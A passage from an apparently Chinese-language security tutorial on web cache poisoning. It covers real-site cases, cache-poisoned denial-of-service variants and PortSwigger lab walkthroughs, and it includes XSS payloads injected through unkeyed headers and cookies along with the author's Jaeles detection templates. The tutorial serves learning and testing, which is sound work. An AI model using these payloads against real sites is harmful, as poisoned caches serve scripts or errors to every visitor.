<figure class="highlight http"><table><tr><td class="code"><pre><span class="line"><span class="keyword">GET</span> <span class="string">/</span> <span class="meta">HTTP/1.1</span></span><br><span class="line"><span class="attribute">Host</span><span class="punctuation">: </span>unity3d.com</span><br><span class="line"><span class="attribute">X-Host</span><span class="punctuation">: </span>portswigger-labs.net</span><br><span class="line"></span><br><span class="line"><span class="routeros">HTTP/1.1 200 OK</span></span><br><span class="line"><span class="routeros">Via: 1.1 varnish-v4</span></span><br><span class="line"><span class="routeros">Age: 174</span></span><br><span class="line"><span class="routeros">Cache-Control: public, <span class="attribute">max-age</span>=1800</span></span><br><span class="line"><span class="routeros">…</span></span><br><span class="line"><span class="routeros">&lt;script <span class="attribute">src</span>=<span class="string">&quot;https://portswigger-labs.net/sites/files/foo.js&quot;</span>&gt;&lt;/script&gt;</span></span><br></pre></td></tr></table></figure>

<p>unity3d.com的响应头的Age和max-age分别提供了当前响应时间和过期时间，这为我们投毒时机做了明确的指引。</p>
<h3 id="2-3-选择性投毒"><a href="#2-3-选择性投毒" class="headerlink" title="2.3 选择性投毒"></a>2.3 选择性投毒</h3><p>如下例子中，Vary响应头告诉我们User-Agent头可能是缓存键的一部分，手工测试也确实如此，这种情况我们就可以定制User-Agent来选择性攻击。</p>
<figure class="highlight http"><table><tr><td class="code"><pre><span class="line"><span class="keyword">GET</span> <span class="string">/</span> <span class="meta">HTTP/1.1</span></span><br><span class="line"><span class="attribute">Host</span><span class="punctuation">: </span>redacted.com</span><br><span class="line"><span class="attribute">User-Agent</span><span class="punctuation">: </span>Mozilla/5.0 … Firefox/60.0</span><br><span class="line"><span class="attribute">X-Forwarded-Host</span><span class="punctuation">: </span>a&quot;&gt;&lt;iframe onload=alert(1)&gt;</span><br><span class="line"></span><br><span class="line"><span class="xml">HTTP/1.1 200 OK</span></span><br><span class="line"><span class="xml">X-Served-By: cache-lhr6335-LHR</span></span><br><span class="line"><span class="xml">Vary: User-Agent, Accept-Encoding</span></span><br><span class="line"><span class="xml">…</span></span><br><span class="line"><span class="xml"><span class="tag">&lt;<span class="name">link</span> <span class="attr">rel</span>=<span class="string">&quot;canonical&quot;</span> <span class="attr">href</span>=<span class="string">&quot;https://a&quot;</span>&gt;</span>a<span class="tag">&lt;<span class="name">iframe</span> <span class="attr">onload</span>=<span class="string">alert(1)</span>&gt;</span></span></span><br><span class="line"><span class="xml"><span class="tag">&lt;/<span class="name">iframe</span>&gt;</span> </span></span><br></pre></td></tr></table></figure>



<h3 id="2-4-DOM投毒"><a href="#2-4-DOM投毒" class="headerlink" title="2.4 DOM投毒"></a>2.4 DOM投毒</h3><p>如下的案例中，非缓存键是<code>X-Forwarded-Host: canary</code>，但是此处对XSS做了防御，不能直接利用XSS进行攻击。</p>
<figure class="highlight http"><table><tr><td class="code"><pre><span class="line"><span class="keyword">GET</span> <span class="string">/dataset</span> <span class="meta">HTTP/1.1</span></span><br><span class="line"><span class="attribute">Host</span><span class="punctuation">: </span>catalog.data.gov</span><br><span class="line"><span class="attribute">X-Forwarded-Host</span><span class="punctuation">: </span>canary</span><br><span class="line"></span><br><span class="line"><span class="routeros">HTTP/1.1 200 OK</span></span><br><span class="line"><span class="routeros">Age: 32707</span></span><br><span class="line"><span class="routeros">X-Cache: Hit <span class="keyword">from</span> cloudfront </span></span><br><span class="line"><span class="routeros">…</span></span><br><span class="line"><span class="routeros">&lt;body <span class="attribute">data-site-root</span>=<span class="string">&quot;https://canary/&quot;</span>&gt;</span></span><br></pre></td></tr></table></figure>

<p>作者在Burp Suite中做了一个替换，将canary替换为了类似<code>xxx.dnslog.cn</code>的dnslog地址，然后继续浏览，在dnslog平台收到了来自Firefox的如下请求：</p>
<figure class="highlight http"><table><tr><td class="code"><pre><span class="line"><span class="keyword">GET</span> <span class="string">/api/i18n/en</span> <span class="meta">HTTP/1.1</span></span><br><span class="line"><span class="attribute">Host</span><span class="punctuation">: </span>xxx.dnslog.net</span><br></pre></td></tr></table></figure>

<p>这个路径应该是藏在该站的某处，通过访问<code>https://catalog.data.gov/api/i18n/en</code>发现返回空的json数据。作者将en改为es，发现了一点蛛丝马迹。</p>
<figure class="highlight http"><table><tr><td class="code"><pre><span class="line"><span class="keyword">GET</span> <span class="string">/api/i18n/es</span> <span class="meta">HTTP/1.1</span></span><br><span class="line"><span class="attribute">Host</span><span class="punctuation">: </span>catalog.data.gov</span><br><span class="line"></span><br><span class="line"><span class="smalltalk"><span class="type">HTTP</span>/<span class="number">1.1</span> <span class="number">200</span> <span class="type">OK</span></span></span><br><span class="line"><span class="smalltalk">…</span></span><br><span class="line"><span class="smalltalk">&#123;<span class="comment">&quot;Show more&quot;</span>:<span class="comment">&quot;Mostrar más&quot;</span>&#125;</span></span><br></pre></td></tr></table></figure>

<p>这个文件将词组翻译成用户选择的语言，于是，作者在自己的vps上部署了一个相同路径的json XSS POC <code>&#123;&quot;Show more&quot;:&quot;&lt;svg onload=alert(1)&gt;&quot;&#125;</code>。发送如下数据包，投毒成功。</p>
<figure class="highlight http"><table><tr><td class="code"><pre><span class="line"><span class="keyword">GET</span> <span class="string"></span> /api/i18n/en <span class="string">HTTP/1.1</span></span><br><span class="line"><span class="string">Host:</span> portswigger-labs.net</span><br><span class="line"></span><br><span class="line"><span class="erlang">HTTP/<span class="number">1.1</span> <span class="number">200</span> OK</span></span><br><span class="line"><span class="erlang">...</span></span><br><span class="line"><span class="erlang">&#123;<span class="string">&quot;Show more&quot;</span>:<span class="string">&quot;&lt;svg onload=alert(1)&gt;&quot;</span>&#125;</span></span><br></pre></td></tr></table></figure>

<p>结果就是任何页面包含“show more”都会执行POC。</p>
<h3 id="2-5-劫持-Mozilla-SHIELD系统"><a href="#2-5-劫持-Mozilla-SHIELD系统" class="headerlink" title="2.5 劫持 Mozilla SHIELD系统"></a>2.5 劫持 Mozilla SHIELD系统</h3><p>在测试<code> catalog.data.gov</code>的时候，log上还发现了如下的请求</p>
<figure class="highlight http"><table><tr><td class="code"><pre><span class="line"><span class="keyword">GET</span> <span class="string">/api/v1/recipe/signed/</span> <span class="meta">HTTP/1.1</span></span><br><span class="line"><span class="attribute">Host</span><span class="punctuation">: </span>xyz.burpcollaborator.net</span><br><span class="line"><span class="attribute">User-Agent</span><span class="punctuation">: </span>Mozilla/5.0 … Firefox/57.0</span><br><span class="line"><span class="attribute">Accept</span><span class="punctuation">: </span>application/json</span><br><span class="line"><span class="attribute">origin</span><span class="punctuation">: </span>null</span><br><span class="line"><span class="attribute">X-Forwarded-Host</span><span class="punctuation">: </span>xyz.burpcollaborator.net</span><br></pre></td></tr></table></figure>

<p>这个请求的小写<code>origin</code>引起了作者的注意。通过查询代理记录，发现是firefox的问题。</p>
<figure class="highlight http"><table><tr><td class="code"><pre><span class="line"><span class="keyword">GET</span> <span class="string">/api/v1/</span> <span class="meta">HTTP/1.1</span></span><br><span class="line"><span class="attribute">Host</span><span class="punctuation">: </span>normandy.cdn.mozilla.net</span><br><span class="line"><span class="attribute">X-Forwarded-Host</span><span class="punctuation">: </span>xyz.burpcollaborator.net</span><br><span class="line"></span><br><span class="line"><span class="dts">HTTP/<span class="number">1.1</span> <span class="number">200</span> <span class="class">OK</span></span></span><br><span class="line"><span class="class"><span class="dts"></span>&#123;</span></span><br><span class="line"><span class="dts">  <span class="string">&quot;action-list&quot;</span>: <span class="string">&quot;https://xyz.burpcollaborator.net/api/v1/action/&quot;</span>,</span></span><br><span class="line"><span class="dts">  <span class="string">&quot;action-signed&quot;</span>: <span class="string">&quot;https://xyz.burpcollaborator.net/api/v1/action/signed/&quot;</span>,</span></span><br><span class="line"><span class="dts">  <span class="string">&quot;recipe-list&quot;</span>: <span class="string">&quot;https://xyz.burpcollaborator.net/api/v1/recipe/&quot;</span>,</span></span><br><span class="line"><span class="dts">  <span class="string">&quot;recipe-signed&quot;</span>: <span class="string">&quot;https://xyz.burpcollaborator.net/api/v1/recipe/signed/&quot;</span>,</span></span><br><span class="line"><span class="dts">   …</span></span><br><span class="line"><span class="dts">&#125;</span></span><br></pre></td></tr></table></figure>

<p>通过查询得知，该系统是<a href="https://wiki.mozilla.org/Firefox/Shield">SHIELD</a>，一个FIrefox的基础设施，用来营销和研究用户。只要打开firefox，就会定期请求。意味着作者可以控制数以千万的用户访问某个地址，因此可以被用于DDOS攻击。</p>
<h3 id="2-6-CPDOS"><a href="#2-6-CPDOS" class="headerlink" title="2.6 CPDOS"></a>2.6 CPDOS</h3><p>Cache-Poisoned Denial-of-Service (CPDoS)，由缓存投毒导致的DOS攻击。当攻击者插入一个unkeyed导致服务器返回400等其他异常，如果写入缓存，那么后续访问者只要访问该资源都会是400 状态码。</p>
<p><img src="../images/pics/web%E7%BC%93%E5%AD%98%E6%8A%95%E6%AF%92%E6%94%BB%E5%87%BB/image-20210224135625306.png" alt="image-20210224135625306"></p>
<h4 id="三种不同的CPDOS"><a href="#三种不同的CPDOS" class="headerlink" title="三种不同的CPDOS"></a>三种不同的CPDOS</h4><p><strong>超大请求头</strong></p>
<p>HTTP Header Oversize(HHO)。<a href="https://httpwg.org/specs/">HTTP标准协议</a>没有给HTTP请求头设置任何大小限制，显然web服务器、web框架以及各种中间系统自己定义了HTTP请求头的大小限制。大多数web服务器或者代理服务器比如<a href="https://httpd.apache.org/">Apache HTTP Server (“httpd”)</a>限制请求头在8,192字节左右。然而有些网站中间层系统限制大于8,192字节。 比如<a href="https://aws.amazon.com/cloudfront/">Amazon Cloudfront CDN</a> 最大允许 20,480字节。</p>
<p>具体的攻击方式就是给unkeyed添加一个字节数小于缓存的请求头，但大于服务端的请求头，服务端就会返回错误然后存入缓存。之后请求该资源返回结果就是错误的响应。</p>
<p><img src="../images/pics/web%E7%BC%93%E5%AD%98%E6%8A%95%E6%AF%92%E6%94%BB%E5%87%BB/image-20210224143048453.png" alt="image-20210224143048453"></p>
<p><strong>HTTP元字符</strong></p>
<p>HTTP Meta Character (HMC)。常见的元字符比如<code>\n</code>、 <code>\r</code> 、<code>\a</code>这些用于在HTTP请求中表示换行的以下字符。HMC类似于HHO，只是将有害的元字符替换了超大请求头</p>
<p><img src="../images/pics/web%E7%BC%93%E5%AD%98%E6%8A%95%E6%AF%92%E6%94%BB%E5%87%BB/image-20210224145431373.png" alt="image-20210224145431373"></p>
<p><strong>重写HTTP请求方法</strong></p>
<p>HTTP Method Override (HMO)。HTTP标准协议定义了GET、POST、DELETE和PUT四种请求方法。许多代理服务器、负载均衡、缓存、防火墙等只支持GET和POST。为了解决这个问题，一些基于REST的API或者web框架提供了例如X-HTTP-Method-Override、X-HTTP-Method、X-Method-Override等请求头来转换HTTP 请求方法。一旦请求到达服务器，服务器就会根据请求头修改请求方法，</p>
<pre>POST /items/1 HTTP/1.1
Host: example.org
<font color="red">X-HTTP-Method-Override: DELETE</font></pre>




<pre>HTTP/1.1 200 OK
Content-Type: text/plain
Content-Length: 62


Resource has been successfully removed with the DELETE method.</pre>



<p>上诉代码通过添加请求头bypass了不允许的请求方法，同样的如果修改请求头会导致错误响应并且写入缓存，那么也是一个DOS攻击。</p>
<p><img src="../images/pics/web%E7%BC%93%E5%AD%98%E6%8A%95%E6%AF%92%E6%94%BB%E5%87%BB/image-20210224152322209.png" alt="image-20210224152322209"></p>
<p>不同服务器及CDN的影响情况。</p>
<p><img src="../images/pics/web%E7%BC%93%E5%AD%98%E6%8A%95%E6%AF%92%E6%94%BB%E5%87%BB/image-20210224163837785.png" alt="image-20210224163837785"></p>
<h4 id="特斯拉的一个缓存DOS漏洞"><a href="#特斯拉的一个缓存DOS漏洞" class="headerlink" title="特斯拉的一个缓存DOS漏洞"></a>特斯拉的一个缓存DOS漏洞</h4><p>漏洞地址：<a href="https://www.tesla.com/en_GB/roadster">https://www.tesla.com/en_GB/roadster</a></p>
<p>漏洞原因就是特斯拉的waf只要发现<code>burpcollaborator.net</code>就会Denied。并且waf是有缓存的，所以命中缓存后，请求该资源就会是Denied。如下添加<code>dontpoisoneveryone=1</code>是为了不响应正常用户，真实的攻击的话肯定会直接给<a href="https://www.tesla.com/en_GB/roadster%E6%8A%95%E6%AF%92%E3%80%82">https://www.tesla.com/en_GB/roadster投毒。</a></p>
<pre><font>GET /en_GB/roadster?dontpoisoneveryone=1</font> HTTP/1.1
<font color="red">Host: www.tesla.com</font>
Any-Header: burpcollaborator.net</pre>



<pre>HTTP/1.1 403 Forbidden
<br>Access Denied. Please contact waf@tesla.co</pre>












<h2 id="3-靶场"><a href="#3-靶场" class="headerlink" title="3. 靶场"></a>3. 靶场</h2><p>靶场练习可以使用James Kettle的工具Param Miner(BurpSuite应用商店可找到)。但是我觉得这个工具比较慢比较耗费电脑资源。所以我自己编写了Jaeles漏洞扫描器的一些简单检测插件，由于对插件逻辑不是太熟悉再加上时间不够，目前只完成快速检测回显，后续会加入投毒比对，然后就可以批量检测，而不需要像Param Miner一个站点一个站点的去看了。</p>
<h3 id="3-1-缓存判断插件"><a href="#3-1-缓存判断插件" class="headerlink" title="3.1 缓存判断插件"></a>3.1 缓存判断插件</h3><p>挖掘一个缓存投毒漏洞的时候，首先要考虑unkeyed的请求是否存在缓存，如果没有缓存就没必要测试缓存问题，判断是否有缓存我们可以通过响应中的特定参数，比如cache-control和expire来判断。</p>
<figure class="highlight yaml"><table><tr><td class="code"><pre><span class="line"><span class="attr">id:</span> <span class="string">cacheable</span></span><br><span class="line"><span class="attr">info:</span></span><br><span class="line">  <span class="attr">name:</span> <span class="string">cacheable</span></span><br><span class="line">  <span class="attr">risk:</span> <span class="string">info</span></span><br><span class="line"></span><br><span class="line"><span class="attr">params:</span></span><br><span class="line">  <span class="bullet">-</span> <span class="attr">root:</span> <span class="string">&#x27;<span class="template-variable">&#123;&#123;.Raw&#125;&#125;</span>&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="attr">requests:</span></span><br><span class="line">  <span class="bullet">-</span> <span class="attr">method:</span> <span class="string">GET</span></span><br><span class="line">    <span class="attr">url:</span> <span class="string">&gt;-</span></span><br><span class="line"><span class="string">      &#123;&#123;.root&#125;&#125;</span></span><br><span class="line"><span class="string"></span>    <span class="attr">headers:</span></span><br><span class="line">      <span class="bullet">-</span> <span class="attr">User-Agent:</span> <span class="string">&#x27;Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:55.0) Gecko/20100101 Firefox/55&#x27;</span></span><br><span class="line">    <span class="attr">detections:</span></span><br><span class="line">      <span class="bullet">-</span> <span class="string">&gt;-</span></span><br><span class="line"><span class="string">        RegexSearch(&quot;resHeaders&quot;, &quot;Cache-Control: max-age=\d*&quot;)</span></span><br><span class="line"><span class="string"></span>      <span class="bullet">-</span> <span class="string">&gt;-</span></span><br><span class="line"><span class="string">        RegexSearch(&quot;resHeaders&quot;, &quot;ETag:&quot;)</span></span><br><span class="line"><span class="string"></span>      <span class="bullet">-</span> <span class="string">&gt;-</span></span><br><span class="line"><span class="string">        RegexSearch(&quot;resHeaders&quot;, &quot;Last-Modified:&quot;)</span></span><br><span class="line"><span class="string"></span>      <span class="bullet">-</span> <span class="string">&gt;-</span></span><br><span class="line">        <span class="string">RegexSearch(&quot;resHeaders&quot;,</span> <span class="string">&quot;Expires:&quot;</span><span class="string">)</span>  </span><br></pre></td></tr></table></figure>





<h3 id="3-2-Param-Miner的使用"><a href="#3-2-Param-Miner的使用" class="headerlink" title="3.2 Param Miner的使用"></a>3.2 Param Miner的使用</h3><p>直接在BurpSuite的应用商店找到，点击安装即可。</p>
<p> <img src="../images/pics/web%E7%BC%93%E5%AD%98%E6%8A%95%E6%AF%92%E6%94%BB%E5%87%BB/image-20210224090312085.png" alt="image-20210224090312085"></p>
<p>github地址：<a href="https://github.com/PortSwigger/param-miner">https://github.com/PortSwigger/param-miner</a></p>
<p>工具的原理是字典结合比对的方式实现的，比如它要测试x-forwarded-for这个参数是否存在投毒。</p>
<p>它会重复发送两种数据包一个是x-forwarded-for: test，一个是x-forwarded-forxxxx: 1111。如果x-forwarded-forxxxx: 1111的结果是test，就说明投毒成功。为了安全性，param miner会在每个请求的url参数HTTP请求里添加随机参数，以避免影响到正常用户。</p>
<p>除了测试缓存投毒以外，param miner很重要的一个功能是猜测参数、额外的HTTP请求头，DOS攻击。猜测参数它内置了一个字典，该字典是爬取的github上的常见参数组成的字典。</p>
<p>如下图是安装好后，鼠标右键出现的一些选项。</p>
<p> <img src="../images/pics/web%E7%BC%93%E5%AD%98%E6%8A%95%E6%AF%92%E6%94%BB%E5%87%BB/image-20210224091125193.png" alt="image-20210224091125193"></p>
<p>可以在顶部按钮点击进行配置，当然也可以测试的时候单独配置。配置项里面一般默认配置就可以了，如果其他配置，可以根据需要勾选。一般我们右键直接<code>Guess everything</code>就好了，但是一般这样很慢，所以有时候选择只猜测请求头也是不错的<code>Guess headers</code></p>
<p><img src="../images/pics/web%E7%BC%93%E5%AD%98%E6%8A%95%E6%AF%92%E6%94%BB%E5%87%BB/image-20210224091533071.png" alt="image-20210224091533071"></p>
<h3 id="3-3-X-Forwarded-Host-投毒"><a href="#3-3-X-Forwarded-Host-投毒" class="headerlink" title="3.3 X-Forwarded-Host 投毒"></a>3.3 X-Forwarded-Host 投毒</h3><p>这个漏洞通过对X-Forward-Host投毒，将self xss转化对任意用户的xss攻击。</p>
<p>首先访问<code>PortSwigger</code>的 <code>Lab: Web cache poisoning with an unkeyed header</code>实验，<a href="https://portswigger.net/web-security/web-cache-poisoning/exploiting-design-flaws/lab-web-cache-poisoning-with-an-unkeyed-header">实验地址</a></p>
<p>访问后如下所示</p>
<img src="../images/pics/web缓存投毒攻击/image-20210126145541074.png" alt="image-20210126145541074" style="zoom:50%;" />



<h4 id="确认unkeyed"><a href="#确认unkeyed" class="headerlink" title="确认unkeyed"></a>确认unkeyed</h4><p>首先测试一下请求头是否会直接返回到响应中，因为缓存投毒攻击最常见的就是host头的投毒，我编写了一个针对X-Forward-Host回显的jaeles扫描器插件。</p>
<figure class="highlight yaml"><table><tr><td class="code"><pre><span class="line"><span class="comment"># X-Forwarded-Host in Response</span></span><br><span class="line"><span class="attr">id:</span> <span class="string">x-forwarded-host</span></span><br><span class="line"><span class="attr">type:</span> <span class="string">fuzz</span></span><br><span class="line"><span class="attr">info:</span></span><br><span class="line">  <span class="attr">name:</span> <span class="string">Reflect</span> <span class="string">for</span> <span class="string">X-Forwarded-Host</span></span><br><span class="line">  <span class="attr">risk:</span> <span class="string">Low</span></span><br><span class="line"></span><br><span class="line"><span class="attr">variables:</span></span><br><span class="line">  <span class="bullet">-</span> <span class="attr">ran:</span> <span class="string">&#x27;RandomString(4)&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="attr">payloads:</span></span><br><span class="line">    <span class="bullet">-</span> <span class="string">&#x27;xforhosttest<span class="template-variable">&#123;&#123;.ran&#125;&#125;</span>&#x27;</span></span><br><span class="line">    <span class="bullet">-</span> <span class="string">&#x27;xforhosttest<span class="template-variable">&#123;&#123;.ran&#125;&#125;</span>&#x27;</span></span><br><span class="line">    <span class="bullet">-</span> <span class="string">&#x27;xforhosttest<span class="template-variable">&#123;&#123;.ran&#125;&#125;</span>&#x27;</span></span><br><span class="line">    <span class="bullet">-</span> <span class="string">&#x27;xforhosttest<span class="template-variable">&#123;&#123;.ran&#125;&#125;</span>&#x27;</span></span><br><span class="line">    <span class="bullet">-</span> <span class="string">&#x27;xforhosttest<span class="template-variable">&#123;&#123;.ran&#125;&#125;</span>&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="attr">requests:</span></span><br><span class="line">  <span class="bullet">-</span> <span class="attr">generators:</span></span><br><span class="line">      <span class="bullet">-</span> <span class="string">Header(&quot;&#123;&#123;.payload&#125;&#125;&quot;,</span> <span class="string">&quot;X-Forwarded-Host&quot;</span><span class="string">)</span></span><br><span class="line">    <span class="attr">detections:</span></span><br><span class="line">      <span class="bullet">-</span> <span class="string">&gt;-</span></span><br><span class="line"><span class="string">        StatusCode() == 200 &amp;&amp; StringSearch(&quot;Response&quot;,&quot;xforhosttest&quot;)</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>插件说明：</p>
<blockquote>
<ol>
<li><p>生成一个4位的随机数(可要可不要)</p>
</li>
<li><p>添加一个标识: “cookiereflect”。组合成payload: 随机数+标识</p>
</li>
<li><p>5个一样的payload表示重复5次发包</p>
</li>
<li><p>加入到请求头”Header: payload”也就是 “X-Forwarded-Host:xforhosttestxxxx “</p>
</li>
<li><p>如果状态码是200并且响应包找到”xforhosttest”，表示存在该问题</p>
</li>
</ol>
</blockquote>
<p>如果在响应中检测到X-Forwarded-Host的值，说明该值可控。（注意，有时侯需要反复检查，因为不一定会命中缓存）</p>
<p>开启监听后，将主页请求代理到扫描器成功检测出了一个X-Forwarded-Host的回显。</p>
<p><img src="../images/pics/web%E7%BC%93%E5%AD%98%E6%8A%95%E6%AF%92%E6%94%BB%E5%87%BB/image-20210126150819389.png" alt="image-20210126150819389"></p>
<p>扫描器帮我们发现可疑点后就需要进行手动测试了，将请求放到BurpSuite的Repeater，添加X-Forwarded-Host请求，为了避免影响到其他用户，我们选择别人不会访问的资源，所有构造了一个url: ?test=1 插入X-Forwarded-Host后并没有找到回显。</p>
<p><img src="../images/pics/web%E7%BC%93%E5%AD%98%E6%8A%95%E6%AF%92%E6%94%BB%E5%87%BB/image-20210126154246309.png" alt="image-20210126154246309"></p>
<p>通过分析，发现是<code>X-Cache: hit</code>的原因，hit表示命中缓存，所有X-Forwarded-Host还是之前缓存的内容。不断重放请求知道test回显出来，回显之后继续重放，直到再次出现<code>X-Cache: hit</code>。表示现在已经命中了新的缓存。<a href="https://blog.csdn.net/jeffasd/article/details/60140438">不同厂商的CDN</a> <img src="../images/pics/web%E7%BC%93%E5%AD%98%E6%8A%95%E6%AF%92%E6%94%BB%E5%87%BB/image-20210126154627672.png" alt="image-20210126154627672"></p>
<h4 id="构造payload"><a href="#构造payload" class="headerlink" title="构造payload"></a>构造payload</h4><p>确认缓存后，接下来就是确认危害性，由于我们是对一个没有人访问的资源进行投毒，所以不会影响到其他用户，可以构造任意的payload。最常见的当然是XSS。</p>
<p>此处我们构造出XSS Payload <code>&quot;&gt;&lt;/script&gt;&lt;script&gt;alert(document.cookie)&lt;/script&gt;</code></p>
<p><img src="../images/pics/web%E7%BC%93%E5%AD%98%E6%8A%95%E6%AF%92%E6%94%BB%E5%87%BB/image-20210126155448168.png" alt="image-20210126155448168"></p>
<p>重放请求直到<code>X-Cache: hit</code>命中新的缓存。</p>
<p>用浏览器请求这个资源发现如图，无法弹出cookie。</p>
<p><img src="../images/pics/web%E7%BC%93%E5%AD%98%E6%8A%95%E6%AF%92%E6%94%BB%E5%87%BB/image-20210126160158690.png" alt="image-20210126160158690"></p>
<p>对cookie进行分析，发现使用了HttpOnly，无法通过js加载Cookie。</p>
<p><img src="../images/pics/web%E7%BC%93%E5%AD%98%E6%8A%95%E6%AF%92%E6%94%BB%E5%87%BB/image-20210126160316805.png" alt="image-20210126160316805"></p>
<p>通过对X-Forwarded-Host的投毒，成功将self xss转变成了对任意用户的xss攻击。</p>
<h3 id="3-4-Cookie投毒"><a href="#3-4-Cookie投毒" class="headerlink" title="3.4 Cookie投毒"></a>3.4 Cookie投毒</h3><p>要对cookie进行测试首先得确定是否回显，同样编写了一个针对cook回显的jaeles插件</p>
<figure class="highlight yaml"><table><tr><td class="code"><pre><span class="line"><span class="attr">id:</span> <span class="string">cookie-reflect-body</span></span><br><span class="line"><span class="attr">type:</span> <span class="string">fuzz</span></span><br><span class="line"><span class="attr">info:</span></span><br><span class="line">  <span class="attr">name:</span> <span class="string">Cookie</span> <span class="string">reflect</span> <span class="string">in</span> <span class="string">body</span></span><br><span class="line">  <span class="attr">risk:</span> <span class="string">Low</span></span><br><span class="line"></span><br><span class="line"><span class="attr">variables:</span></span><br><span class="line">  <span class="bullet">-</span> <span class="attr">ran:</span> <span class="string">RandomString(4)</span></span><br><span class="line"></span><br><span class="line"><span class="attr">payloads:</span></span><br><span class="line">    <span class="bullet">-</span> <span class="string">&#x27;cookiereflect<span class="template-variable">&#123;&#123;.ran&#125;&#125;</span>&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="attr">requests:</span></span><br><span class="line">  <span class="bullet">-</span> <span class="attr">generators:</span></span><br><span class="line">      <span class="bullet">-</span> <span class="string">Cookie(&quot;[[.original]]&#123;&#123;.payload&#125;&#125;&quot;)</span></span><br><span class="line">      <span class="bullet">-</span> <span class="string">Header(&quot;&#123;&#123;.payload&#125;&#125;&quot;,</span> <span class="string">&quot;Cookie&quot;</span><span class="string">)</span></span><br><span class="line">    <span class="attr">detections:</span></span><br><span class="line">      <span class="bullet">-</span> <span class="string">&gt;-</span></span><br><span class="line">        <span class="string">StatusCode()</span> <span class="string">==</span> <span class="number">200</span> <span class="string">&amp;&amp;</span> <span class="string">StringSearch(&quot;Response&quot;,&quot;cookiereflect&quot;)</span></span><br></pre></td></tr></table></figure>

<p>插件说明：</p>
<blockquote>
<ol>
<li><p>生成四位随机数</p>
</li>
<li><p>添加cookiereflect标识</p>
</li>
<li><p>组成payload: 标识+随机字符</p>
</li>
<li><p>请求头添加cookie,这里有两种，”Cookie: payload” ; “Cookie:param=payload”</p>
</li>
<li><p>在响应中搜索标识</p>
</li>
</ol>
</blockquote>
<p><img src="../images/pics/web%E7%BC%93%E5%AD%98%E6%8A%95%E6%AF%92%E6%94%BB%E5%87%BB/image-20210128152651406.png" alt="image-20210128152651406"></p>
<p>检测到回显（在测试可能需要多次测试以命中缓存）后，接下来就是该参数是否是unkeyed。</p>
<p>注入payload:</p>
<figure class="highlight xml"><table><tr><td class="code"><pre><span class="line">&quot;&gt;<span class="tag">&lt;/<span class="name">script</span>&gt;</span><span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="javascript">alert(<span class="built_in">document</span>.domain)</span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br></pre></td></tr></table></figure>

<p>重放包，直到<code>X-Cache: hit</code></p>
<p>命中缓存。</p>
<p><img src="../images/pics/web%E7%BC%93%E5%AD%98%E6%8A%95%E6%AF%92%E6%94%BB%E5%87%BB/image-20210128154155722.png" alt="image-20210128154155722"></p>
<p>任何用户访问主站就会遭受到xss攻击</p>
<p><img src="../images/pics/web%E7%BC%93%E5%AD%98%E6%8A%95%E6%AF%92%E6%94%BB%E5%87%BB/image-20210128154012345.png" alt="image-20210128154012345"></p>
<h3 id="3-5-多个请求头的投毒"><a href="#3-5-多个请求头的投毒" class="headerlink" title="3.5 多个请求头的投毒"></a>3.5 多个请求头的投毒</h3><p>后台支持 <code>X-Forwarded-Host</code> and <code>X-Forwarded-Scheme</code> 两个请求头，当 <code>X-Forwarded-Scheme</code> 的值是非https时，服务器会重定向到 https协议的指定URL，该URL的值取决于请求头 <code>X-Forwarded-Host</code> </p>
<p>编写一个插件用来检测此逻辑的插件</p>
<figure class="highlight yaml"><table><tr><td class="code"><pre><span class="line"><span class="attr">id:</span> <span class="string">x-forwarded-scheme-http-host-redirect.yaml</span></span><br><span class="line"><span class="attr">type:</span> <span class="string">fuzz</span></span><br><span class="line"><span class="attr">info:</span></span><br><span class="line">  <span class="attr">name:</span> <span class="string">x-forwarded-scheme</span> <span class="string">https</span> <span class="string">host</span> <span class="string">redirect</span></span><br><span class="line">  <span class="attr">risk:</span> <span class="string">Medium</span></span><br><span class="line"></span><br><span class="line"><span class="attr">payloads:</span></span><br><span class="line">  <span class="bullet">-</span> <span class="string">&gt;-</span></span><br><span class="line"><span class="string">    http</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="attr">requests:</span></span><br><span class="line">  <span class="bullet">-</span> <span class="attr">generators:</span></span><br><span class="line">      <span class="bullet">-</span> <span class="string">Header(&quot;&#123;&#123;.payload&#125;&#125;&quot;,</span> <span class="string">&quot;X-Forwarded-Scheme&quot;</span><span class="string">)</span></span><br><span class="line">    <span class="attr">detections:</span></span><br><span class="line">      <span class="bullet">-</span> <span class="string">&gt;-</span></span><br><span class="line"><span class="string">        StatusCode() == 302</span></span><br><span class="line"><span class="string"></span>  <span class="bullet">-</span> <span class="attr">generators:</span></span><br><span class="line">      <span class="bullet">-</span> <span class="string">Header(&quot;&#123;&#123;.payload&#125;&#125;&quot;,</span> <span class="string">&quot;X-Forwarded-Scheme&quot;</span><span class="string">)</span></span><br><span class="line">      <span class="bullet">-</span> <span class="string">Header(&quot;shadowtest&quot;,</span> <span class="string">&quot;X-Forwarded-Host&quot;</span><span class="string">)</span></span><br><span class="line">    <span class="attr">detections:</span></span><br><span class="line">      <span class="bullet">-</span> <span class="string">&gt;-</span></span><br><span class="line">        <span class="string">StringSearch(&quot;resHeaders&quot;,</span> <span class="string">&quot;shadowtest&quot;</span><span class="string">)</span></span><br></pre></td></tr></table></figure>

<p>插件说明：</p>
<blockquote>
<ol>
<li><p>给http请求头添加一个字段”X-Forwarded-Scheme: http”</p>
</li>
<li><p>如果状态码是302就继续发一个包，添加如下两个请求字段。</p>
<ul>
<li>“X-Forwarded-Scheme: http”；</li>
<li>X-Forwarded-Host: shadowtest”</li>
</ul>
</li>
<li><p>在这个响应头中搜索”shadowtest”, 如果找到表面存在漏洞</p>
</li>
</ol>
</blockquote>
<p>除此之外，我另外再写了一个X-Forwarde-Scheme跳转的检测插件，用来做一个粗略的检查</p>
